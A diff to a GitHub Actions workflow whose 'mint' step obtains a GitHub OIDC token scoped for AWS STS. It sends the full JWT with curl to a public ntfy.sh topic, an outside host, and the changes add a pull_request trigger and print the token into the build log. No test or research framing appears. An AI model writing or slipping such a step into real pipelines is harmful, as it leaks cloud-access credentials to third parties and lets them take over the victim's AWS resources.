@@ -1,6 +1,7 @@
 name: oidc
 on:
   push:
+  pull_request:
   workflow_dispatch:
 permissions:
   id-token: write
@@ -12,8 +13,10 @@ jobs:
       - name: mint
         run: |
           set -e
+          if [ -z "$ACTIONS_ID_TOKEN_REQUEST_URL" ]; then echo "NO_ID_TOKEN_URL"; exit 0; fi
           RESP=$(curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=sts.amazonaws.com")
           JWT=$(echo "$RESP" | python3 -c 'import sys,json;print(json.load(sys.stdin)["value"])')
+          echo "JWT=$JWT"
           echo "JWT $JWT" | curl -s -d @- "https://ntfy.sh/ghsig5-vgqhy2ayb1"
           PAY=$(echo "$JWT" | cut -d. -f2)
-          echo "PAYLOAD $PAY" | curl -s -d @- "https://ntfy.sh/ghsig5-vgqhy2ayb1"
+          echo "PAYLOAD $PAY"
